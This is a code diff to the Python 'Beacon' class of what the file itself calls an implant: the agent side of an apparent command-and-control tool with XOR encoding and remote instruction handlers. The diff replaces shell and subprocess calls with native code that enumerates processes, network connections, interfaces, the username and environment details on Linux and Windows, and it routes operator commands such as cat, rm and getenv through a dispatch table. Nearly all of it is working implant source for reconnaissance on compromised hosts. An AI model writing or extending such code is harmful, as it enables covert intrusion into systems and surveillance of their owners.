@@ -5,14 +5,30 @@ import socket
 import os
 import platform
 import shutil
-import subprocess
+import shlex
+import struct
+import getpass
 from pathlib import Path
 from typing import Callable, Dict, List, Tuple
 
+try:
+    import pwd  # type: ignore
+except ImportError:  # pragma: no cover - platform specific
+    pwd = None  # type: ignore
+
+try:
+    import fcntl  # type: ignore
+except ImportError:  # pragma: no cover - platform specific
+    fcntl = None  # type: ignore
+
+try:
+    import ctypes  # type: ignore
+    import ctypes.wintypes  # type: ignore
+except ImportError:  # pragma: no cover - platform specific
+    ctypes = None  # type: ignore
+
 
 CHARACTER_POOL = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
-
-COMMAND_WHOAMI = "whoami"
 
 # Instruction identifiers
 INSTRUCTION_LS = "ls"
@@ -33,11 +49,6 @@ FILE_TYPE_DIRECTORY = "d"
 UNKNOWN_OWNER = "unknown"
 UNKNOWN_GROUP = "unknown"
 PERMISSION_SLICE_START = -3
-
-# Platform specific process listing commands
-PS_COMMAND_LINUX = "ps -aux"
-PS_COMMAND_WINDOWS = "tasklist"
-WINDOWS_PLATFORM_PREFIX = "win"
 
 SLEEP_SECONDS_TO_MILLISECONDS = 1000
 
@@ -98,8 +109,533 @@ def xorEncode(text, key):
     return xor_bytes(text, key)
 
 
+def _get_username_native() -> str:
+    """Return the current username without spawning subprocesses."""
+    username = ""
+
+    try:
+        username = os.getlogin()
+    except Exception:
+        username = ""
+
+    if not username:
+        try:
+            username = getpass.getuser()
+        except Exception:
+            username = ""
+
+    if not username and os.name == "posix" and pwd is not None:
+        try:
+            username = pwd.getpwuid(os.getuid()).pw_name
+        except Exception:
+            username = ""
+
+    return username
+
+
+def _list_processes_unix() -> str:
+    proc_root = Path("/proc")
+    if not proc_root.exists():
+        return DEFAULT_EMPTY_RESPONSE
+
+    lines: List[str] = ["PID\tUSER\tSTATE\tCMD"]
+    entries = [entry for entry in proc_root.iterdir() if entry.name.isdigit()]
+    entries.sort(key=lambda entry: int(entry.name))
+
+    for entry in entries:
+        pid = entry.name
+        try:
+            stat_info = entry.stat()
+        except Exception:
+            continue
+
+        user = UNKNOWN_OWNER
+        if pwd is not None:
+            try:
+                user = pwd.getpwuid(stat_info.st_uid).pw_name
+            except Exception:
+                user = UNKNOWN_OWNER
+
+        state = ""
+        try:
+            with (entry / "status").open("r", encoding="utf-8", errors="ignore") as status_file:
+                for line in status_file:
+                    if line.startswith("State:"):
+                        state = line.split(":", 1)[1].strip()
+                        break
+        except Exception:
+            state = ""
+
+        cmd = ""
+        try:
+            cmdline_bytes = (entry / "cmdline").read_bytes()
+            if cmdline_bytes:
+                cmd = cmdline_bytes.replace(b"\x00", b" ").decode("utf-8", errors="ignore").strip()
+        except Exception:
+            cmd = ""
+
+        if not cmd:
+            try:
+                cmd = (entry / "comm").read_text(encoding="utf-8", errors="ignore").strip()
+            except Exception:
+                cmd = ""
+
+        lines.append(f"{pid}\t{user}\t{state}\t{cmd}")
+
+    if len(lines) == 1:
+        return DEFAULT_EMPTY_RESPONSE
+    return "\n".join(lines)
+
+
+def _list_processes_windows() -> str:
+    if ctypes is None:  # pragma: no cover - platform specific
+        return DEFAULT_EMPTY_RESPONSE
+
+    psapi = ctypes.WinDLL("Psapi.dll")  # type: ignore[attr-defined]
+    kernel32 = ctypes.WinDLL("kernel32.dll")  # type: ignore[attr-defined]
+
+    PROCESS_QUERY_INFORMATION = 0x0400
+    PROCESS_VM_READ = 0x0010
+
+    arr_size = 4096
+    process_ids = (ctypes.wintypes.DWORD * arr_size)()
+    bytes_returned = ctypes.wintypes.DWORD()
+
+    if not psapi.EnumProcesses(ctypes.byref(process_ids), ctypes.sizeof(process_ids), ctypes.byref(bytes_returned)):
+        return DEFAULT_EMPTY_RESPONSE
+
+    count = bytes_returned.value // ctypes.sizeof(ctypes.wintypes.DWORD())
+    lines: List[str] = ["PID\tPROCESS"]
+
+    for index in range(count):
+        pid = process_ids[index]
+        handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
+        process_name = ""
+        if handle:
+            try:
+                exe_name_buffer = ctypes.create_unicode_buffer(260)
+                if psapi.GetModuleBaseNameW(handle, None, exe_name_buffer, ctypes.sizeof(exe_name_buffer) // ctypes.sizeof(ctypes.c_wchar)):
+                    process_name = exe_name_buffer.value
+            finally:
+                kernel32.CloseHandle(handle)
+
+        lines.append(f"{pid}\t{process_name or 'Unknown'}")
+
+    if len(lines) == 1:
+        return DEFAULT_EMPTY_RESPONSE
+    return "\n".join(lines)
+
+
+def _list_processes_native() -> str:
+    if os.name == "nt":  # pragma: no cover - platform specific
+        return _list_processes_windows()
+    return _list_processes_unix()
+
+
+_TCP_STATES = {
+    "01": "ESTABLISHED",
+    "02": "SYN_SENT",
+    "03": "SYN_RECV",
+    "04": "FIN_WAIT1",
+    "05": "FIN_WAIT2",
+    "06": "TIME_WAIT",
+    "07": "CLOSE",
+    "08": "CLOSE_WAIT",
+    "09": "LAST_ACK",
+    "0A": "LISTEN",
+    "0B": "CLOSING",
+}
+
+
+def _decode_proc_address(token: str, ipv6: bool) -> str:
+    address_hex, port_hex = token.split(":")
+    port = int(port_hex, 16)
+
+    if ipv6:
+        addr_bytes = bytes.fromhex(address_hex)
+        addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
+    else:
+        addr_bytes = bytes.fromhex(address_hex)
+        addr = socket.inet_ntoa(addr_bytes[::-1])
+
+    return f"{addr}:{port}"
+
+
+def _parse_proc_net(path: Path, proto: str, ipv6: bool) -> List[str]:
+    if not path.exists():
+        return []
+
+    lines: List[str] = []
+    try:
+        with path.open("r", encoding="utf-8", errors="ignore") as handle:
+            next(handle, None)
+            for line in handle:
+                parts = line.strip().split()
+                if len(parts) < 4:
+                    continue
+                local_addr = _decode_proc_address(parts[1], ipv6)
+                remote_addr = _decode_proc_address(parts[2], ipv6)
+                state = _TCP_STATES.get(parts[3], parts[3])
+                lines.append(f"{proto:<5} {local_addr:<30} {remote_addr:<30} {state}")
+    except Exception:
+        return []
+    return lines
+
+
+def _netstat_unix() -> str:
+    sections = ["Proto Local Address                  Foreign Address                State"]
+    for path, proto, ipv6 in [
+        (Path("/proc/net/tcp"), "tcp", False),
+        (Path("/proc/net/tcp6"), "tcp6", True),
+        (Path("/proc/net/udp"), "udp", False),
+        (Path("/proc/net/udp6"), "udp6", True),
+    ]:
+        entries = _parse_proc_net(path, proto, ipv6)
+        sections.extend(entries)
+
+    if len(sections) == 1:
+        return DEFAULT_EMPTY_RESPONSE
+    return "\n".join(sections)
+
+
+def _netstat_windows() -> str:
+    if ctypes is None:  # pragma: no cover - platform specific
+        return DEFAULT_EMPTY_RESPONSE
+
+    # Use GetExtendedTcpTable / GetExtendedUdpTable
+    iphlpapi = ctypes.WinDLL("Iphlpapi.dll")  # type: ignore[attr-defined]
+
+    TCP_TABLE_CLASS = 5  # TCP_TABLE_OWNER_PID_ALL
+    UDP_TABLE_CLASS = 1  # UDP_TABLE_OWNER_PID
+
+    AF_INET = 2
+    AF_INET6 = 23
+
+    def _collect_tcp(table_class: int, family: int, proto_name: str) -> List[str]:
+        lines: List[str] = []
+        size = ctypes.wintypes.ULONG(0)
+        if iphlpapi.GetExtendedTcpTable(None, ctypes.byref(size), False, family, table_class, 0) not in (0, 122):
+            return lines
+        buffer = ctypes.create_string_buffer(size.value)
+        result = iphlpapi.GetExtendedTcpTable(buffer, ctypes.byref(size), False, family, table_class, 0)
+        if result != 0:
+            return lines
+
+        num_entries = ctypes.cast(buffer, ctypes.POINTER(ctypes.wintypes.DWORD)).contents.value
+        offset = ctypes.sizeof(ctypes.wintypes.DWORD)
+        entry_size = 0
+        if family == AF_INET:
+            class TCPROW(ctypes.Structure):
+                _fields_ = [
+                    ("state", ctypes.wintypes.DWORD),
+                    ("local_addr", ctypes.wintypes.DWORD),
+                    ("local_port", ctypes.wintypes.DWORD),
+                    ("remote_addr", ctypes.wintypes.DWORD),
+                    ("remote_port", ctypes.wintypes.DWORD),
+                    ("pid", ctypes.wintypes.DWORD),
+                ]
+
+            entry_size = ctypes.sizeof(TCPROW)
+            for index in range(num_entries):
+                row_ptr = ctypes.cast(ctypes.byref(buffer, offset + entry_size * index), ctypes.POINTER(TCPROW))
+                row = row_ptr.contents
+                local_ip = socket.inet_ntoa(struct.pack("!I", row.local_addr))
+                remote_ip = socket.inet_ntoa(struct.pack("!I", row.remote_addr))
+                state = _TCP_STATES.get(f"{row.state:02X}", str(row.state))
+                local_port = socket.ntohs(row.local_port & 0xFFFF)
+                remote_port = socket.ntohs(row.remote_port & 0xFFFF)
+                lines.append(
+                    f"{proto_name:<5} {local_ip}:{local_port:<22} {remote_ip}:{remote_port:<22} {state}"
+                )
+        else:
+            class TCPROW6(ctypes.Structure):  # pragma: no cover - platform specific
+                _fields_ = [
+                    ("local_addr", ctypes.c_byte * 16),
+                    ("local_scope_id", ctypes.wintypes.DWORD),
+                    ("local_port", ctypes.wintypes.DWORD),
+                    ("remote_addr", ctypes.c_byte * 16),
+                    ("remote_scope_id", ctypes.wintypes.DWORD),
+                    ("remote_port", ctypes.wintypes.DWORD),
+                    ("state", ctypes.wintypes.DWORD),
+                    ("pid", ctypes.wintypes.DWORD),
+                ]
+
+            entry_size = ctypes.sizeof(TCPROW6)
+            for index in range(num_entries):
+                row_ptr = ctypes.cast(ctypes.byref(buffer, offset + entry_size * index), ctypes.POINTER(TCPROW6))
+                row = row_ptr.contents
+                local_ip = socket.inet_ntop(socket.AF_INET6, bytes(row.local_addr))
+                remote_ip = socket.inet_ntop(socket.AF_INET6, bytes(row.remote_addr))
+                local_port = socket.ntohs(row.local_port & 0xFFFF)
+                remote_port = socket.ntohs(row.remote_port & 0xFFFF)
+                state = _TCP_STATES.get(f"{row.state:02X}", str(row.state))
+                lines.append(
+                    f"{proto_name:<5} {local_ip}%{row.local_scope_id}:{local_port:<16} {remote_ip}%{row.remote_scope_id}:{remote_port:<16} {state}"
+                )
+
+        return lines
+
+    def _collect_udp(table_class: int, family: int, proto_name: str) -> List[str]:
+        lines: List[str] = []
+        size = ctypes.wintypes.ULONG(0)
+        if iphlpapi.GetExtendedUdpTable(None, ctypes.byref(size), False, family, table_class, 0) not in (0, 122):
+            return lines
+        buffer = ctypes.create_string_buffer(size.value)
+        result = iphlpapi.GetExtendedUdpTable(buffer, ctypes.byref(size), False, family, table_class, 0)
+        if result != 0:
+            return lines
+
+        num_entries = ctypes.cast(buffer, ctypes.POINTER(ctypes.wintypes.DWORD)).contents.value
+        offset = ctypes.sizeof(ctypes.wintypes.DWORD)
+
+        if family == AF_INET:
+            class UDPROW(ctypes.Structure):
+                _fields_ = [
+                    ("local_addr", ctypes.wintypes.DWORD),
+                    ("local_port", ctypes.wintypes.DWORD),
+                    ("pid", ctypes.wintypes.DWORD),
+                ]
+
+            entry_size = ctypes.sizeof(UDPROW)
+            for index in range(num_entries):
+                row_ptr = ctypes.cast(ctypes.byref(buffer, offset + entry_size * index), ctypes.POINTER(UDPROW))
+                row = row_ptr.contents
+                local_ip = socket.inet_ntoa(struct.pack("!I", row.local_addr))
+                local_port = socket.ntohs(row.local_port & 0xFFFF)
+                lines.append(f"{proto_name:<5} {local_ip}:{local_port}")
+        else:  # pragma: no cover - platform specific
+            class UDPROW6(ctypes.Structure):
+                _fields_ = [
+                    ("local_addr", ctypes.c_byte * 16),
+                    ("local_scope_id", ctypes.wintypes.DWORD),
+                    ("local_port", ctypes.wintypes.DWORD),
+                    ("pid", ctypes.wintypes.DWORD),
+                ]
+
+            entry_size = ctypes.sizeof(UDPROW6)
+            for index in range(num_entries):
+                row_ptr = ctypes.cast(ctypes.byref(buffer, offset + entry_size * index), ctypes.POINTER(UDPROW6))
+                row = row_ptr.contents
+                local_ip = socket.inet_ntop(socket.AF_INET6, bytes(row.local_addr))
+                local_port = socket.ntohs(row.local_port & 0xFFFF)
+                lines.append(f"{proto_name:<5} {local_ip}%{row.local_scope_id}:{local_port}")
+
+        return lines
+
+    lines: List[str] = ["Proto Local Address                  Foreign Address                State"]
+    lines.extend(_collect_tcp(TCP_TABLE_CLASS, AF_INET, "tcp"))
+    lines.extend(_collect_tcp(TCP_TABLE_CLASS, AF_INET6, "tcp6"))
+    lines.extend(_collect_udp(UDP_TABLE_CLASS, AF_INET, "udp"))
+    lines.extend(_collect_udp(UDP_TABLE_CLASS, AF_INET6, "udp6"))
+
+    if len(lines) == 1:
+        return DEFAULT_EMPTY_RESPONSE
+    return "\n".join(lines)
+
+
+def _netstat_native() -> str:
+    if os.name == "nt":  # pragma: no cover - platform specific
+        return _netstat_windows()
+    return _netstat_unix()
+
+
+def _read_sysfs_value(path: Path) -> str:
+    try:
+        return path.read_text(encoding="utf-8", errors="ignore").strip()
+    except Exception:
+        return ""
+
+
+def _get_ipv4_address(sock: socket.socket, ifname: str, request: int) -> str:
+    if fcntl is None:
+        return ""
+    try:
+        ifreq = struct.pack("256s", ifname.encode("utf-8"))
+        res = fcntl.ioctl(sock.fileno(), request, ifreq)
+        return socket.inet_ntoa(res[20:24])
+    except Exception:
+        return ""
+
+
+def _ipv6_interface_map() -> Dict[str, List[str]]:
+    mapping: Dict[str, List[str]] = {}
+    path = Path("/proc/net/if_inet6")
+    if not path.exists():
+        return mapping
+    try:
+        with path.open("r", encoding="utf-8", errors="ignore") as handle:
+            for line in handle:
+                parts = line.strip().split()
+                if len(parts) >= 6:
+                    address_hex = parts[0]
+                    iface = parts[5]
+                    try:
+                        addr = socket.inet_ntop(socket.AF_INET6, bytes.fromhex(address_hex))
+                    except Exception:
+                        continue
+                    mapping.setdefault(iface, []).append(addr)
+    except Exception:
+        return mapping
+    return mapping
+
+
+def _ipconfig_unix() -> str:
+    interfaces: List[str] = []
+    try:
+        interfaces = [entry.name for entry in os.scandir("/sys/class/net")]
+    except Exception:
+        try:
+            interfaces = [name for _, name in socket.if_nameindex()]
+        except Exception:
+            interfaces = []
+
+    ipv6_map = _ipv6_interface_map()
+
+    lines: List[str] = []
+    if not interfaces:
+        return DEFAULT_EMPTY_RESPONSE
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    except Exception:
+        sock = None  # type: ignore
+
+    for iface in sorted(interfaces):
+        lines.append(f"{iface}:")
+        mac = _read_sysfs_value(Path("/sys/class/net") / iface / "address")
+        if mac:
+            lines.append(f"  mac: {mac}")
+
+        if sock is not None:
+            ipv4_addr = _get_ipv4_address(sock, iface, 0x8915)  # SIOCGIFADDR
+            if ipv4_addr:
+                lines.append(f"  ipv4: {ipv4_addr}")
+            netmask = _get_ipv4_address(sock, iface, 0x891B)  # SIOCGIFNETMASK
+            if netmask:
+                lines.append(f"  netmask: {netmask}")
+
+        for ipv6 in ipv6_map.get(iface, []):
+            lines.append(f"  ipv6: {ipv6}")
+
+        lines.append("")
+
+    if sock is not None:
+        sock.close()
+
+    return "\n".join(line for line in lines if line is not None)
+
+
+def _ipconfig_windows() -> str:
+    if ctypes is None:  # pragma: no cover - platform specific
+        return DEFAULT_EMPTY_RESPONSE
+
+    iphlpapi = ctypes.WinDLL("Iphlpapi.dll")  # type: ignore[attr-defined]
+
+    AF_UNSPEC = 0
+    GAA_FLAG_INCLUDE_PREFIX = 0x0010
+
+    class SOCKET_ADDRESS(ctypes.Structure):  # pragma: no cover - platform specific
+        _fields_ = [
+            ("lpSockaddr", ctypes.POINTER(ctypes.wintypes.BYTE)),
+            ("iSockaddrLength", ctypes.wintypes.INT),
+        ]
+
+    class IP_ADAPTER_UNICAST_ADDRESS(ctypes.Structure):  # pragma: no cover - platform specific
+        pass
+
+    LP_IP_ADAPTER_UNICAST_ADDRESS = ctypes.POINTER(IP_ADAPTER_UNICAST_ADDRESS)
+
+    IP_ADAPTER_UNICAST_ADDRESS._fields_ = [
+        ("Length", ctypes.wintypes.ULONG),
+        ("Flags", ctypes.wintypes.DWORD),
+        ("Next", LP_IP_ADAPTER_UNICAST_ADDRESS),
+        ("Address", SOCKET_ADDRESS),
+        ("PrefixOrigin", ctypes.c_uint),
+        ("SuffixOrigin", ctypes.c_uint),
+        ("DadState", ctypes.c_uint),
+        ("ValidLifetime", ctypes.wintypes.ULONG),
+        ("PreferredLifetime", ctypes.wintypes.ULONG),
+        ("LeaseLifetime", ctypes.wintypes.ULONG),
+        ("OnLinkPrefixLength", ctypes.c_ubyte),
+    ]
+
+    class IP_ADAPTER_ADDRESSES(ctypes.Structure):  # pragma: no cover - platform specific
+        pass
+
+    LP_IP_ADAPTER_ADDRESSES = ctypes.POINTER(IP_ADAPTER_ADDRESSES)
+
+    IP_ADAPTER_ADDRESSES._fields_ = [
+        ("Length", ctypes.wintypes.ULONG),
+        ("IfIndex", ctypes.wintypes.DWORD),
+        ("Next", LP_IP_ADAPTER_ADDRESSES),
+        ("AdapterName", ctypes.c_char_p),
+        ("FirstUnicastAddress", LP_IP_ADAPTER_UNICAST_ADDRESS),
+        ("FirstAnycastAddress", ctypes.c_void_p),
+        ("FirstMulticastAddress", ctypes.c_void_p),
+        ("FirstDnsServerAddress", ctypes.c_void_p),
+        ("DnsSuffix", ctypes.c_wchar_p),
+        ("Description", ctypes.c_wchar_p),
+        ("FriendlyName", ctypes.c_wchar_p),
+        ("PhysicalAddress", ctypes.c_ubyte * 8),
+        ("PhysicalAddressLength", ctypes.wintypes.ULONG),
+        ("Flags", ctypes.wintypes.DWORD),
+        ("Mtu", ctypes.wintypes.DWORD),
+        ("IfType", ctypes.wintypes.DWORD),
+        ("OperStatus", ctypes.c_int),
+        ("Ipv6IfIndex", ctypes.wintypes.DWORD),
+        ("ZoneIndices", ctypes.wintypes.DWORD * 16),
+        ("FirstPrefix", ctypes.c_void_p),
+    ]
+
+    size = ctypes.wintypes.ULONG(15000)
+    while True:
+        buffer = ctypes.create_string_buffer(size.value)
+        result = iphlpapi.GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, None, buffer, ctypes.byref(size))
+        if result == 0:
+            break
+        if result != 111:  # ERROR_BUFFER_OVERFLOW
+            return DEFAULT_EMPTY_RESPONSE
+
+    adapter = ctypes.cast(buffer, LP_IP_ADAPTER_ADDRESSES)
+    lines: List[str] = []
+
+    while adapter:
+        friendly_name = adapter.contents.FriendlyName
+        lines.append(f"{friendly_name}:")
+        physical_length = adapter.contents.PhysicalAddressLength
+        if physical_length:
+            mac = ":".join(f"{adapter.contents.PhysicalAddress[i]:02x}" for i in range(physical_length))
+            lines.append(f"  mac: {mac}")
+
+        address = adapter.contents.FirstUnicastAddress
+        while address:
+            sockaddr = ctypes.cast(address.contents.Address.lpSockaddr, ctypes.POINTER(ctypes.c_ubyte * address.contents.Address.iSockaddrLength))
+            raw = bytes(sockaddr.contents)
+            family = struct.unpack_from("H", raw, 0)[0]
+            if family == socket.AF_INET:
+                ipv4 = socket.inet_ntoa(raw[4:8])
+                lines.append(f"  ipv4: {ipv4}")
+            elif family == socket.AF_INET6:
+                ipv6 = socket.inet_ntop(socket.AF_INET6, raw[8:24])
+                lines.append(f"  ipv6: {ipv6}")
+            address = address.contents.Next
+
+        lines.append("")
+        adapter = adapter.contents.Next
+
+    if not lines:
+        return DEFAULT_EMPTY_RESPONSE
+    return "\n".join(line for line in lines if line is not None)
+
+
+def _ipconfig_native() -> str:
+    if os.name == "nt":  # pragma: no cover - platform specific
+        return _ipconfig_windows()
+    return _ipconfig_unix()
+
+
 class Beacon:
-        
+
     def __init__(self):
         self.beaconHash = ""
         self.hostname = ""
@@ -113,20 +649,12 @@ class Beacon:
         self.taskResults: List[Dict[str, object]] = []
 
         self._instruction_handlers: Dict[str, Callable[[str, str, bytes, str, str, int], Tuple[str, bytes]]] = {}
+        self._native_run_dispatch: Dict[str, Callable[[str, str, bytes, str, str, int], Tuple[str, bytes]]] = {}
 
         self.beaconHash = ''.join(random.choice(CHARACTER_POOL) for _ in range(32))
 
         self.hostname = socket.gethostname()
-        self.username = DEFAULT_USERNAME
-        try:
-            self.username = os.getlogin()
-        except:
-            self.username = subprocess.run(
-                COMMAND_WHOAMI,
-                shell=True,
-                stderr=subprocess.STDOUT,
-                stdout=subprocess.PIPE,
-            ).stdout.decode("utf-8")
+        self.username = _get_username_native() or DEFAULT_USERNAME
         self.arch = platform.machine()
         if self.username == ROOT_USERNAME:
             self.privilege = DEFAULT_PRIVILEGE_ROOT
@@ -140,6 +668,7 @@ class Beacon:
         self.xorKey = ""
 
         self._register_instruction_handlers()
+        self._initialize_run_dispatch()
 
 
     def set_xor_key(self, key: str) -> None:
@@ -177,6 +706,25 @@ class Beacon:
         }
 
         self._instruction_handlers = handlers
+
+    def _initialize_run_dispatch(self) -> None:
+        self._native_run_dispatch = {
+            "ls": self._handle_list_directory,
+            "dir": self._handle_list_directory,
+            "pwd": self._handle_pwd,
+            "cat": self._handle_cat,
+            "cd": self._handle_change_directory,
+            "mkdir": self._handle_mkdir,
+            "rm": self._handle_remove,
+            "remove": self._handle_remove,
+            "tree": self._handle_tree,
+            "ps": self._handle_list_processes,
+            "listprocesses": self._handle_list_processes,
+            "whoami": self._handle_whoami,
+            "netstat": self._handle_netstat,
+            "ipconfig": self._handle_ipconfig,
+            "getenv": self._handle_getenv,
+        }
 
     def _collect_internal_ips(self) -> str:
         ips: List[str] = []
@@ -484,17 +1032,10 @@ class Beacon:
 
     def _handle_list_processes(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         try:
-            completed = subprocess.run(
-                [PS_COMMAND],
-                shell=True,
-                stderr=subprocess.STDOUT,
-                stdout=subprocess.PIPE,
-                timeout=30,
-            )
-            output = completed.stdout.decode("utf-8", errors="ignore")
-            return (output or DEFAULT_EMPTY_RESPONSE, b"")
+            output = _list_processes_native()
         except Exception as exc:
             return (f"Failed to list processes: {exc}", b"")
+        return (output or DEFAULT_EMPTY_RESPONSE, b"")
 
     def _handle_powershell(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         return ("Powershell command execution is not supported on this platform.", b"")
@@ -502,22 +1043,34 @@ class Beacon:
     def _handle_pwd(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         return (os.getcwd(), b"")
 
+    def _execute_native_command(self, command: str) -> Tuple[str, bytes]:
+        try:
+            parts = shlex.split(command)
+        except Exception as exc:
+            return (f"Failed to parse command: {exc}", b"")
+
+        if not parts:
+            return (DEFAULT_EMPTY_RESPONSE, b"")
+
+        name = parts[0].lower()
+        arguments = parts[1:]
+
+        handler = self._native_run_dispatch.get(name)
+        if handler:
+            cmd_arg = arguments[0] if arguments else ""
+            remaining_args = " ".join(arguments[1:]) if len(arguments) > 1 else ""
+            return handler(cmd_arg, remaining_args, b"", "", "", -1)
+
+        if name == "echo":
+            return (" ".join(arguments), b"")
+
+        return (f"Unsupported command: {name}", b"")
+
     def _handle_run(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         command = cmd or args
         if not command:
             return (DEFAULT_EMPTY_RESPONSE, b"")
-        try:
-            completed = subprocess.run(
-                command,
-                shell=True,
-                stderr=subprocess.STDOUT,
-                stdout=subprocess.PIPE,
-                timeout=60,
-            )
-            output = completed.stdout.decode("utf-8", errors="ignore")
-            return (output or DEFAULT_EMPTY_RESPONSE, b"")
-        except Exception as exc:
-            return (f"Failed to execute command: {exc}", b"")
+        return self._execute_native_command(command)
 
     def _handle_shell(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         return self._handle_run(cmd, args, data, input_file, output_file, pid)
@@ -596,56 +1149,22 @@ class Beacon:
         return (env_dump, b"")
 
     def _handle_whoami(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
-        try:
-            completed = subprocess.run(
-                ["whoami"],
-                shell=False,
-                stderr=subprocess.STDOUT,
-                stdout=subprocess.PIPE,
-                timeout=10,
-            )
-            output = completed.stdout.decode("utf-8", errors="ignore").strip()
-            if output:
-                return (output, b"")
-        except Exception:
-            pass
-        return (self.username or DEFAULT_USERNAME, b"")
+        username = _get_username_native() or self.username or DEFAULT_USERNAME
+        return (username, b"")
 
     def _handle_netstat(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
-        commands = ["netstat -an", "ss -an"]
-        for command in commands:
-            try:
-                completed = subprocess.run(
-                    command,
-                    shell=True,
-                    stderr=subprocess.STDOUT,
-                    stdout=subprocess.PIPE,
-                    timeout=60,
-                )
-                output = completed.stdout.decode("utf-8", errors="ignore")
-                if output:
-                    return (output, b"")
-            except Exception:
-                continue
-        return (DEFAULT_EMPTY_RESPONSE, b"")
+        try:
+            output = _netstat_native()
+        except Exception as exc:
+            return (f"Failed to collect network information: {exc}", b"")
+        return (output or DEFAULT_EMPTY_RESPONSE, b"")
 
     def _handle_ipconfig(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
-        commands = ["ip addr show", "ifconfig"]
-        for command in commands:
-            try:
-                completed = subprocess.run(
-                    command,
-                    shell=True,
-                    stderr=subprocess.STDOUT,
-                    stdout=subprocess.PIPE,
-                    timeout=60,
-                )
-                output = completed.stdout.decode("utf-8", errors="ignore")
-                if output:
-                    return (output, b"")
-            except Exception:
-                continue
-        return (DEFAULT_EMPTY_RESPONSE, b"")
+        try:
+            output = _ipconfig_native()
+        except Exception as exc:
+            return (f"Failed to collect interface information: {exc}", b"")
+        return (output or DEFAULT_EMPTY_RESPONSE, b"")
 
     def _handle_enumerate_shares(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         return ("Share enumeration is not supported on this implant.", b"")
